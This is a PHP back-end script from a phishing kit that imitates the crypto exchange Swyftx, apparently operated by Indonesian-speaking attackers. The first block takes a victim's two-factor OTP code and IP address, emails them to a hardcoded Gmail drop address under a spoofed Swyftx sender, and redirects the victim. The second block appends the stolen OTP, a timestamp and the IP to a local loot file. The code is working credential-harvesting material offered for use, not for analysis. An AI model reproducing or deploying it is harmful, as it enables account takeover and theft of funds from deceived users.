<?php

$ip 	= getenv("REMOTE_ADDR");
$code   = $_POST['code'];




$message = "

=============BISMILLAHAJADULU============

Code		: $code
IP		: $ip

=============BISMILLAHAJADULU============ ";


$to = "ninakarusa@gmail.com"; // ganti email
$subject = "SWYTFX OTP = [$ip]";
$headers = "From: SETORAN <setoran@trade.swyftxau.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($to, $subject, $message,$headers);


header("Location:index.html");


?>

<?php
$ip   = getenv("REMOTE_ADDR");
$file = "_________________1MILYARD__________________.txt";
$email   = $_POST['email'];
$password = $_POST['password'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "=================O--T--P=================");
fwrite($handle, "\n");
fwrite($handle, "Kode OTP FA2	: ");
fwrite($handle, "$code");
fwrite($handle, "\n");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "=============BISMILLAHAJADULU============");
fwrite($handle, "\n");
fclose($handle);

?>
